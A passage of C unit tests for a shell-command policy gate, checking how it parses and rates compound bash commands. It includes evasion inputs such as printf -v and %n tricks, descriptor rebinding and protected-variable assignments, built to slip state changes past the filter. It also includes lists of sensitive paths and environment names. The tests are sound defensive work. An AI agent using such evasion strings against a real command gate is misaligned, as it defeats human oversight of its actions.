  static const char *const invalidated[] = {
      ("exec {fd}>/tmp/builtin-route; printf -vother -vfd %s one >&$fd; "
       "printf x >&$fd"),
      ("exec {fd}>/tmp/builtin-route; declare bad-name fd=changed; "
       "printf x >&$fd"),
      "exec {fd}>/tmp/builtin-route; printf -vother -v 'values[0]' %s one",
      "exec {fd}>/tmp/builtin-route; printf -v scratch 'abc%n' fd; "
      "printf x >&$fd",
      "exec {fd}>/tmp/builtin-route; printf '%s%n' x other y fd; "
      "printf x >&$fd",
      "exec {fd}>/tmp/builtin-route; declare -i scratch='fd=2'; "
      "printf x >&$fd",
      "exec {fd}>/tmp/builtin-route; OPTIND='fd=2'; printf x >&$fd",
      "exec {fd}>/tmp/builtin-route; OPTIND+='fd=2' printf x; printf x >&$fd",
      "exec {fd}>/tmp/builtin-route; printf '\\%n' fd; printf x >&$fd",
      "exec {fd}>/tmp/builtin-route; printf '\\%s%n' other fd; printf x >&$fd",
      "exec {RANDOM}>/tmp/builtin-route; printf x >&$RANDOM",
      "exec {UID}>/tmp/builtin-route; printf x >&$UID",
      "exec {POSIXLY_CORRECT}>/tmp/builtin-route",
  };
  for (size_t i = 0; i < sizeof(invalidated) / sizeof(invalidated[0]); i++) {
    ASSERT(eval_cmd(gate, invalidated[i], &result) == SG_ERR_PARSE);
    ASSERT(result.verdict == SG_VERDICT_REJECT &&
           result.subcommand_count == 1 &&
           result.subcommands[0].verdict == SG_VERDICT_REJECT);
  }
  sg_gate_free(gate);
}

TEST(quoted_named_fd_mutation_policy_contract) {
  sg_gate_t *gate =
      gate_with_rules((const char *[]){"exec", "unset *", "printf *"}, 3);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));

  static const char quoted_target[] =
      "exec {left}>/tmp/left; exec {right}>/tmp/right; unset 'left'; "
      "printf payload >&$right";
  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, quoted_target, &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 4);
  for (size_t i = 0; i < result.subcommand_count; i++)
    ASSERT(result.subcommands[i].verdict == SG_VERDICT_ALLOW);

  static const char dynamic_target[] =
      "exec {left}>/tmp/left; exec {right}>/tmp/right; unset \"$target\"; "
      "printf payload >&$right";
  ASSERT(sg_gate_evaluate(gate, dynamic_target, sizeof(dynamic_target) - 1,
                          eval_buf, sizeof(eval_buf), &result) == SG_ERR_PARSE);
  ASSERT(result.verdict == SG_VERDICT_REJECT && result.subcommand_count == 1 &&
         result.subcommands[0].verdict == SG_VERDICT_REJECT &&
         strcmp(eval_buf, "parse error") == 0);
  sg_gate_free(gate);
}

TEST(decoded_assignment_policy_contract) {
  sg_gate_t *gate =
      gate_with_rules((const char *[]){"exec", "export *", "printf *"}, 3);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate,
                        "exec {fd}>/tmp/route; "
                        "export \"OTHER=$(printf data)\"; "
                        "printf payload >&$fd",
                        &result));
  ASSERT(result.verdict != SG_VERDICT_REJECT);

  static const char *const protected_assignments[] = {
      "export \"POSIXLY_CORRECT=1\"",
      "export POSIXLY_CORRECT=\"1\"",
      "POSIXLY_CORRECT=\"1\" true",
  };
  for (size_t i = 0;
       i < sizeof(protected_assignments) / sizeof(protected_assignments[0]);
       i++) {
    ASSERT(eval_cmd(gate, protected_assignments[i], &result) == SG_ERR_PARSE);
    ASSERT(result.verdict == SG_VERDICT_REJECT &&
           result.subcommand_count == 1 &&
           result.subcommands[0].verdict == SG_VERDICT_REJECT);
  }
  sg_gate_free(gate);
}

TEST(composition_verdict_matrix) {
  static const struct {
    const char *allow[3];
    size_t allow_count;
    const char *deny;
    uint32_t reject_mask;
    const char *command;
    sg_verdict_t verdict;
    size_t subcommands;
    bool conditional;
  } cases[] = {
      {{"ls", "pwd"}, 2, NULL, 0, "ls ; pwd", SG_VERDICT_ALLOW, 2, false},
      {{"ls", "pwd"}, 2, NULL, 0, "ls && pwd", SG_VERDICT_ALLOW, 2, false},
      {{"ls", "pwd"}, 2, NULL, 0, "ls || pwd", SG_VERDICT_ALLOW, 2, false},
      {{"ls", "sort"}, 2, NULL, 0, "ls | sort", SG_VERDICT_ALLOW, 2, false},
      {{"ls"}, 1, NULL, 0, "ls && rm", SG_VERDICT_UNDETERMINED, 2, false},
      {{"ls"}, 1, NULL, 0, "rm || ls", SG_VERDICT_UNDETERMINED, 2, false},
      {{"ls", "sort"}, 2, "sort", 0, "ls | sort", SG_VERDICT_DENY, 2, false},
      {{"echo *", "whoami"},
       2,
       NULL,
       0,
       "echo $(whoami)",
       SG_VERDICT_ALLOW_CONDITIONAL,
       2,
       true},
      {{"echo *", "pwd"},
       2,
       NULL,
       SHELL_FEAT_VARS,
       "echo $HOME ; pwd",
       SG_VERDICT_REJECT,
       1,
       false},
  };

  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_gate_t *gate = gate_with_rules(cases[i].allow, cases[i].allow_count);
    ASSERT(gate != NULL);
    ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
    ASSERT_SG_OK(sg_gate_set_reject_mask(gate, cases[i].reject_mask));
    if (cases[i].deny)
      ASSERT_ST_OK(test_policy_replace_cpl(gate, true, cases[i].deny, false));

    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, cases[i].command, &result));
    ASSERT(result.verdict == cases[i].verdict);
    if (result.subcommand_count != cases[i].subcommands) {
      fprintf(stderr, "composition row %zu: got %u subcommands, expected %zu\n",
              i, result.subcommand_count, cases[i].subcommands);
      fail_count++;
    }
    ASSERT(result.requires_substitution_evaluation == cases[i].conditional);
    ASSERT(!result.short_circuited && !result.truncated);
    sg_gate_free(gate);
  }
}

TEST(composition_policy_matrix) {
  static const struct {
    const char *rules[3];
    size_t rule_count;
    const char *command;
    uint32_t count;
  } cases[] = {
      {{"echo one", "echo two"}, 2, "echo one & echo two", 2},
      {{"echo one", "echo two"}, 2, "(echo one; echo two)", 2},
  };
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_gate_t *gate = gate_with_rules(cases[i].rules, cases[i].rule_count);
    ASSERT(gate != NULL);
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, cases[i].command, &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW);
    ASSERT(result.subcommand_count == cases[i].count);

    sg_gate_free(gate);
  }
}

TEST(compound_group_execution_context_contract) {
  static const char *rules[] = {"echo one", "echo two", "pwd", "cat"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));

  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, "{ echo one; echo two; } & pwd", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 3);

  ASSERT_SG_OK(eval_cmd(gate, "{ echo one; echo two; } | cat", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 3);

  sg_gate_free(gate);
}

TEST(posix_brace_group_pipeline) {
  const char *command =
      "cd /workspace && { sleep 2; printf 'q'; } | ./clock > /tmp/clock.out";
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));

  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  /* cd owns the AND status; it cannot be collapsed into an earlier command
   * or discarded before the compound pipeline's execution endpoint. */
  ASSERT(result.subcommand_count == 4);
  ASSERT(!result.truncated && !result.short_circuited);
  ASSERT_STR(result.subcommands[0].display_command, "cd /workspace");
  ASSERT_STR(result.subcommands[1].display_command, "sleep 2");
  ASSERT_STR(result.subcommands[2].display_command, "printf 'q'");
  ASSERT_STR(result.subcommands[3].display_command, "./clock");
  ASSERT_STR(result.subcommands[0].netargv, "2:cd,10:/workspace,");
  ASSERT_STR(result.subcommands[1].netargv, "5:sleep,1:2,");
  ASSERT_STR(result.subcommands[2].netargv, "6:printf,1:q,");
  ASSERT_STR(result.subcommands[3].netargv, "7:./clock,");

  sg_gate_free(gate);
}

TEST(bash_pipe_both_policy_contract) {
  static const char *rules[] = {"printf *", "cat"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));

  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, "printf value |& cat", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(result.subcommand_count == 2);
  ASSERT_STR(result.subcommands[0].netargv, "6:printf,5:value,");
  ASSERT_STR(result.subcommands[1].netargv, "3:cat,");

  sg_gate_free(gate);
}

TEST(compound_status_named_fd_continuation) {
  static const char *rules[] = {"false", "true",       "exec",
                                "cat",   "printf * *", "probe"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  static const struct {
    const char *source;
    bool inspection;
  } cases[] = {
      {"{ false; } || { exec {fd}</dev/null; } && cat <&$fd", false},
      {"time -p { { false; }; } || { exec {fd}</dev/null; } && "
       "printf '[%s]' \"$(cat <&$fd)\"",
       true},
      {"! { true; } || { exec {fd}</dev/null; } && probe >\"$(cat <&$fd)\"",
       false},
  };
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, cases[i].source, &result));
    sg_verdict_t expected =
        cases[i].inspection ? SG_VERDICT_ALLOW_CONDITIONAL : SG_VERDICT_ALLOW;
    if (result.verdict != expected || result.truncated) {
      fprintf(stderr,
              "compound gate: source=%s verdict=%d truncated=%d reason=%s\n",
              cases[i].source, result.verdict, result.truncated,
              result.deny_reason ? result.deny_reason : "none");
      for (uint32_t command = 0; command < result.subcommand_count; command++)
        fprintf(stderr, "netargv=%s\n", result.subcommands[command].netargv);
    }
    ASSERT(result.verdict == expected && !result.truncated);
    ASSERT(result.requires_substitution_evaluation == cases[i].inspection);
    ASSERT_STR(result.subcommands[0].netargv, i == 2 ? "4:true," : "5:false,");
    ASSERT_STR(result.subcommands[1].netargv, "4:exec,");
  }
  sg_gate_free(gate);
}

TEST(repeated_pipeline_negation_policy_contract) {
  static const char *rules[] = {"false", "cat", "sort"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));

  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, "! ! false |& cat | sort", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(result.subcommand_count == 3);
  ASSERT_STR(result.subcommands[0].netargv, "5:false,");
  ASSERT_STR(result.subcommands[1].netargv, "3:cat,");
  ASSERT_STR(result.subcommands[2].netargv, "4:sort,");
  ASSERT(sg_gate_evaluate(gate, "! # note\nfalse", strlen("! # note\nfalse"),
                          eval_buf, sizeof(eval_buf), &result) == SG_ERR_PARSE);
  sg_gate_free(gate);
}

TEST(descriptor_scope_policy_contract) {
  static const char *rules[] = {"exec",  "printf *", "echo *",  "true",
                                "false", "probe",    "probe *", "unset *",
                                "wait",  ":",        "fd=1"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  config.sensitive_write_paths[0] = "/tmp/changed";
  config.sensitive_write_path_count = 1;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  static const char *const retained[] = {
      "(exec 3>/tmp/base; exec 3>/tmp/changed | :; printf after >&3)",
      "(exec {fd}>/tmp/base; unset fd | :; printf after >&$fd)",
      "{ exec 3>/tmp/base; exec 3>/tmp/changed & wait; printf after >&3; } | :",
      "exec {fd}>/tmp/base; false && { unset fd; }; printf after >&$fd",
      ("exec {fd}>/tmp/base; probe && { unset fd; }; exec {fd}>/tmp/new && "
       "printf after >&$fd"),
  };
  sg_result_t result;
  for (size_t i = 0; i < sizeof(retained) / sizeof(retained[0]); i++) {
    ASSERT_SG_OK(eval_cmd(gate, retained[i], &result));
    if (result.verdict != SG_VERDICT_ALLOW)
      printf("    descriptor scope case: %s (verdict=%d reason=%s)\n",
             retained[i], result.verdict,
             result.deny_reason ? result.deny_reason : "none");
    ASSERT(result.verdict == SG_VERDICT_ALLOW);
    bool checked = false;
    for (uint32_t command = 0; command < result.subcommand_count; command++)
      if (strcmp(result.subcommands[command].netargv, "6:printf,5:after,") ==
          0) {
        ASSERT(result.subcommands[command].write_count == 1);
        ASSERT((result.subcommands[command].violation_type_flags &
                SG_VIOL_WRITE_SENSITIVE) == 0);
        checked = true;
      }
    ASSERT(checked);
  }
  static const char *const rejected[] = {
      "exec 7>seven && exec {fd}>base && fd=7; "
      "{ exec {fd}>out; true; } >setup; printf payload >&$fd",
      "exec {fd}>base && unset fd; { exec {fd}>out; true; } >setup; "
      "echo \"$(printf payload >&$fd)\"",
      "exec {fd}>/tmp/base; probe && unset fd; printf after >&$fd",
      "exec {fd}>/tmp/base; probe || { unset fd; }; printf after >&$fd",
      "exec {fd}>/tmp/base; probe && { fd=1; }; printf after >&$fd",
      ("exec {fd}</tmp/base; probe && { unset fd; }; echo \"$(printf after "
       "<&$fd)\""),
      "exec {fd}>/tmp/base; probe && { unset fd; }; exec 2>&$fd; time true",
  };
  for (size_t i = 0; i < sizeof(rejected) / sizeof(rejected[0]); i++) {
    ASSERT(eval_cmd(gate, rejected[i], &result) == SG_ERR_PARSE);
    ASSERT(result.verdict == SG_VERDICT_REJECT && result.subcommand_count == 1);
    ASSERT(result.subcommands[0].verdict == SG_VERDICT_REJECT &&
           result.subcommands[0].netargv == NULL);
  }
  sg_gate_free(gate);
}

TEST(inherited_boundary_context_contract) {
  static const char *const rules[] = {"wc -l file.txt", "wc -l other.txt"};
  sg_gate_t *gate = gate_with_rules(rules, 2);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  config.redirect_fanout_threshold = 0;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  static const char *const sources[] = {
      "wc -l file.txt",           "wc -l file.txt 2>&1",
      "wc -l file.txt 0>&1",      "wc -l file.txt 1<&0",
      "wc -l file.txt 2<&0",      "wc -l file.txt 1>&0; wc -l other.txt",
      "{ wc -l file.txt; } 2>&1", "{ wc -l file.txt; } 1<&0",
      "wc -l file.txt &",         "{ wc -l file.txt; } &",
      "time wc -l file.txt &",    "wc -l file.txt && wc -l other.txt &"};
  for (size_t i = 0; i < sizeof(sources) / sizeof(sources[0]); i++) {
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, sources[i], &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW &&
           !result.requires_substitution_evaluation &&
           !result.has_dynamic_substitution_io &&
           !(result.violation_type_flags & SG_VIOL_REDIRECT_FANOUT));
    for (uint32_t command = 0; command < result.subcommand_count; command++)
      ASSERT(result.subcommands[command].read_count == 0 &&
             result.subcommands[command].write_count == 0);
  }
  sg_gate_free(gate);
}

TEST(setup_diagnostic_substitution_contract) {
  static const char *const rules[] = {"exec", "echo", "echo *", "sh * *",
                                      "cat *"};
  sg_gate_t *gate = gate_with_rules(rules, 5);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  static const struct {
    const char *source;
    bool inspection;
  } cases[] = {
      {"exec 3>&-; sh -c \"$(echo 2>&1 >&3)\"", true},
      {"exec 3>&-; sh -c \"$(echo >&3 2>&1)\"", false},
      {"exec 3>&-; sh -c \"$(echo 2>&- >&3)\"", false},
      {"exec 3>&-; sh -c \"$({ echo body; } 2>&1 >&3)\"", true},
      {"sh -c \"$(echo 2>&1 >'')\"", true},
      {"sh -c \"$(echo >'' 2>&1)\"", false},
  };
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, cases[i].source, &result));
    ASSERT(!result.truncated);
    ASSERT(result.has_dynamic_substitution_io == cases[i].inspection);
    ASSERT(result.requires_substitution_evaluation == cases[i].inspection);
    ASSERT(result.verdict == (cases[i].inspection ? SG_VERDICT_ALLOW_CONDITIONAL
                                                  : SG_VERDICT_ALLOW));
  }
  sg_gate_free(gate);
}

TEST(expansion_diagnostic_substitution_contract) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT_NOT_NULL(gate);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  static const struct {
    const char *source;
    bool inspection;
  } cases[] = {
      {"sh -c \"$(exec 2>&1; x=${missing:?expansion-marker})\"", true},
      {"sh -c \"$(exec 2>&1; x=$((1/0)))\"", true},
      {"sh -c \"$(exec 2>&1; x=${value:1/0})\"", true},
      {"sh -c \"$(exec 2>&1; : ${missing:?expansion-marker} 1>&- 2>&-)\"",
       true},
      {"sh -c \"$(exec 2>&1; x=$((1/0)) true 1>&- 2>&-)\"", true},
      {"sh -c \"$(exec 2>&1; export x=${missing:?expansion-marker} 1>&- "
       "2>&-)\"",
       true},
      {"sh -c \"$(exec 2>&-; x=${missing:?expansion-marker})\"", false},
      {"sh -c \"$(exec 2>&1; false 1>&- 2>&- && "
       "x=${missing:?expansion-marker})\"",
       false},
      {"sh -c \"$(x=1)\"", false},
      {"sh -c \"$(exec 2>&1; x='${missing:?literal}')\"", false},
      {"sh -c \"$(: 2>&1 >${missing:?expansion-marker})\"", true},
      {"sh -c \"$(: >${missing:?expansion-marker} 2>&1)\"", false},
      {"sh -c \"$(: 2>&1 <<<$((1/0)))\"", true},
      {"sh -c \"$(: 2>&1 <<EOF 2>&-\n${missing:?expansion-marker}\nEOF\n)\"",
       true},
      {"sh -c \"$({ :; } 2>&1 >${missing:?expansion-marker})\"", true},
  };
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, cases[i].source, &result));
    ASSERT(!result.truncated);
    if (result.has_dynamic_substitution_io != cases[i].inspection)
      printf("\n    diagnostic inspection: %s\n", cases[i].source);
    ASSERT(result.has_dynamic_substitution_io == cases[i].inspection);
    ASSERT(result.requires_substitution_evaluation == cases[i].inspection);
    ASSERT(result.subcommand_count != 0 &&
           result.subcommands[0].netargv_length >= 5 &&
           memcmp(result.subcommands[0].netargv, "2:sh,", 5) == 0);
    ASSERT(result.subcommands[0].requires_substitution_evaluation ==
           cases[i].inspection);
  }
  sg_gate_free(gate);
}

TEST(cd_command_and_capture_contract) {
  static const char *const rules[] = {
      "exec",           "sh * *",         "cd *", "cd * *",
      "command cd * *", "builtin cd * *", "false"};
  sg_gate_t *gate = gate_with_rules(rules, 7);
  ASSERT_NOT_NULL(gate);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  static const struct {
    const char *source;
    bool inspect;
  } cases[] = {
      {"sh -c \"$(exec 2>&1; cd one two)\"", true},
      {"sh -c \"$(cd /; cd -)\"", true},
      {"sh -c \"$({ exec 2>&1; cd one two; })\"", true},
      {"sh -c \"$(exec 2>&1; command cd one two)\"", true},
      {"sh -c \"$(exec 2>&1; builtin cd one two)\"", true},
      {"sh -c \"$(exec 1>&- 2>&-; cd one two)\"", false},
      {"sh -c \"$(false >&- 2>&- && cd one two)\"", false},
  };
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, cases[i].source, &result));
    ASSERT(!result.truncated);
    ASSERT(result.has_dynamic_substitution_io == cases[i].inspect &&
           result.requires_substitution_evaluation == cases[i].inspect);
    ASSERT(result.verdict == (cases[i].inspect ? SG_VERDICT_ALLOW_CONDITIONAL
                                               : SG_VERDICT_ALLOW));
  }
  sg_gate_free(gate);

  /* A retained cd is a normal policy subject, never an implicit allowance. */
  const char *pwd_rule[] = {"pwd"};
  gate = gate_with_rules(pwd_rule, 1);
  ASSERT_NOT_NULL(gate);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, "cd /tmp; pwd", &result));
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED &&
         result.subcommand_count == 2 &&
         result.subcommands[0].verdict == SG_VERDICT_UNDETERMINED &&
         result.subcommands[1].verdict == SG_VERDICT_ALLOW);
  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "cd #path", false));
  ASSERT_SG_OK(eval_cmd(gate, "cd /tmp; pwd", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 2 &&
         result.subcommands[0].verdict == SG_VERDICT_ALLOW &&
         result.subcommands[1].verdict == SG_VERDICT_ALLOW);
  sg_gate_free(gate);
}

TEST(assignment_stream_and_diagnostic_contract) {
  static const char *const rules[] = {
      "sh * *", "exec", "true", "command true", "builtin true", "printf *"};
  sg_gate_t *gate = gate_with_rules(rules, 6);
  ASSERT_NOT_NULL(gate);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  static const struct {
    const char *source;
    bool inspect, outer_inspect;
  } cases[] = {
      {"sh -c \"$(x=1)\"", false, false},
      {"sh -c \"$(exec 2>&1; x=1)\"", false, false},
      {"sh -c \"$(x=$(printf data))\"", true, false},
      {"sh -c \"$(UID=1 2>&1)\"", false, false},
      {"sh -c \"$(exec 2>&1; UID=1)\"", true, true},
      {"sh -c \"$(exec 2>&1; UID=1 1>&- 2>&-)\"", true, true},
      {"sh -c \"$(exec 1>&- 2>&-; UID=1)\"", false, false},
      {"sh -c \"$(exec 2>&1; UID=1 true 1>&- 2>&-)\"", true, true},
      {"sh -c \"$(exec 2>&1; UID=1 command true 1>&- 2>&-)\"", true, true},
      {"sh -c \"$(exec 2>&1; UID=1 builtin true 1>&- 2>&-)\"", true, true},
  };
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, cases[i].source, &result));
    ASSERT(!result.truncated && result.subcommand_count > 0);
    ASSERT(result.requires_substitution_evaluation == cases[i].inspect);
    ASSERT(result.subcommands[0].requires_substitution_evaluation ==
           cases[i].outer_inspect);
    if (cases[i].inspect)
      ASSERT(result.has_dynamic_substitution_io);
  }
  for (unsigned input = 0; input < 2; input++) {
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, input ? "< <(true)" : "> >(true)", &result));
    ASSERT(!result.truncated && result.has_dynamic_substitution_io &&
           !result.requires_substitution_evaluation);
    ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
  }
  sg_gate_free(gate);
}

TEST(rejected_assignment_effect_contract) {
  static const char *const rules[] = {"true", "command true", "builtin true",
                                      "export *", "printf *"};
  sg_gate_t *gate = gate_with_rules(rules, 5);
  ASSERT_NOT_NULL(gate);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  sg_violation_config_t config = {0};
  config.sensitive_env_names[0] = "UID";
  config.sensitive_env_names[1] = "EUID";
  config.sensitive_env_names[2] = "x";
  config.sensitive_env_name_count = 3;
  config.sensitive_cmd_names[0] = "true";
  config.sensitive_cmd_names[1] = "export";
  config.sensitive_cmd_name_count = 2;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  static const struct {
    const char *source;
    uint32_t environments;
    bool privileged, inspect;
  } cases[] = {
      {"UID=1 true", 0, false, false},
      {"UID+=1 true", 0, false, false},
      {"U\\\nID=1 true", 0, false, false},
      {"UID=1 EUID=2 command true", 0, false, false},
      {"UID=1 builtin true", 0, false, false},
      {"UID=$(printf data) true", 0, false, false},
      {"UID=$(printf data) $missing", 0, false, true},
      {"UID=$(printf data) $(true)", 0, false, true},
      {"UID=$(printf data) \"$@\"", 0, false, true},
      {"UID=$(printf data) \"${!prefix@}\"", 0, false, true},
      {"UID=$(printf data) ${!prefix*}", 0, false, true},
      {"UID=$(printf data) \"${@:+data}\"", 0, false, true},
      {"UID=$(printf skipped) \"${!prefix*}\"", 0, false, false},
      {"UID=$(printf skipped) \"${@-data}\"", 0, false, false},
      {"UID=$(printf skipped) \"${@:-data}\"", 0, false, false},
      {"UID=$(printf skipped) \"${@:-}\"", 0, false, false},
      {"UID=$(printf skipped) \"${@?error}\"", 0, false, false},
      {"UID=$(printf skipped) \"${@:?error}\"", 0, false, false},
      {"UID=$(printf skipped) ''", 0, false, false},
      {"UID=$(printf skipped) \"$missing\"", 0, false, false},
      {"UID=$(printf skipped) $missing true", 0, false, false},
      {"UID=$(printf skipped) $missing-suffix", 0, false, false},
      {"UID=${missing:?skipped} $maybe; x=2 true", 0, true, false},
      {"export UID=$(printf data)", 0, false, true},
      {"export -Z x=$(printf data)", 0, false, true},
      {"export UID=1", 0, false, false},
      {"export -p 'U''ID=1' EUID+=2", 0, false, false},
      {"command export UID=1", 0, false, false},
      {"builtin export UID=1", 0, false, false},
      {"export -Z x=1", 0, false, false},
      {"export -f x=1", 0, false, false},
      {"x=2 UID=1 true", 1, true, false},
      {"UID=1 x=2 true", 1, true, false},
      {"export UID=1 x=2", 1, true, false},
      {"export -p UID=1 x=2", 1, true, false},
      {"export -- UID=1 x=2", 1, true, false},
  };
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, cases[i].source, &result));
    ASSERT(!result.truncated && result.subcommand_count > 0);
    ASSERT(result.subcommands[0].env_count == cases[i].environments);
    ASSERT(result.requires_substitution_evaluation == cases[i].inspect);
    ASSERT(((result.violation_type_flags & SG_VIOL_ENV_PRIVILEGED) != 0) ==
           cases[i].privileged);
  }
  ASSERT_ST_OK(test_policy_replace_cpl(gate, true, "printf forbidden", false));
  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, "UID=$(printf forbidden) $maybe", &result));
  ASSERT(result.verdict == SG_VERDICT_DENY &&
         result.requires_substitution_evaluation &&
         result.subcommand_count == 2);
  ASSERT(result.subcommands[1].verdict == SG_VERDICT_DENY);
  ASSERT_SG_OK(eval_cmd(gate, "UID=$(printf forbidden >&2) $maybe", &result));
  ASSERT(result.verdict == SG_VERDICT_DENY && result.subcommand_count == 2 &&
         !result.requires_substitution_evaluation);
  static const char *const guaranteed[] = {
      "UID=$(printf forbidden) $maybe true",
      "UID=$(printf forbidden) \"${!prefix*}\"",
      "UID=$(printf forbidden) \"${@-data}\"",
      "UID=$(printf forbidden) \"${@:-data}\"",
      "UID=$(printf forbidden) \"${@:-}\"",
      "UID=$(printf forbidden) \"${@?error}\"",
      "UID=$(printf forbidden) \"${@:?error}\"",
  };
  for (size_t i = 0; i < sizeof(guaranteed) / sizeof(guaranteed[0]); i++) {
    ASSERT_SG_OK(eval_cmd(gate, guaranteed[i], &result));
    ASSERT(result.subcommand_count == 1 && result.verdict != SG_VERDICT_DENY &&
           !result.requires_substitution_evaluation);
  }
  ASSERT_SG_OK(
      eval_cmd(gate, "UID=$(printf forbidden) \"${!prefix@}\"", &result));
  ASSERT(result.subcommand_count == 2 && result.verdict == SG_VERDICT_DENY &&
         result.requires_substitution_evaluation);
  sg_gate_free(gate);
}

TEST(nested_setup_diagnostic_context_contract) {
  static const char *const rules[] = {":", "echo *"};
  sg_gate_t *gate = gate_with_rules(rules, 2);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(
      gate,
      "{ :; { echo inner; } 3>/tmp/diag-a 4>/tmp/diag-b; echo outer; } "
      ">/tmp/diag-out 2>>/tmp/diag-errors",
      &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 3);
  /* The inner group's two opens can report errors into the outer stderr
   * file: two auxiliary writes plus that diagnostic relation, on top of the
